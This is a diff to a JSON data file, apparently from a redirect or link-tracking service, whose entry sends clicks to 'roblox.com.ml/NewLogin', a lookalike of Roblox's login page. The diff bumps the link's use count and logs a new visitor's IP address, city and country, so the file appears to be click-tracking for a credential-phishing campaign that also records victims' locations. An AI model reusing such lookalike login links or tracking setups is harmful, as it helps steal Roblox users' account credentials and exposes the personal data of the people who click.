@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 732,
+    "useCount": 733,
     "createdBy": "admin",
     "clicks": [
       {
@@ -5966,6 +5966,14 @@
         "ip": "193.229.108.38",
         "country": "Finland",
         "city": "Helsinki",
+        "flag": "🇫🇮",
+        "countryCode": "FI"
+      },
+      {
+        "timestamp": 1777144568065,
+        "ip": "37.136.118.22",
+        "country": "Finland",
+        "city": "Oulu",
         "flag": "🇫🇮",
         "countryCode": "FI"
       }
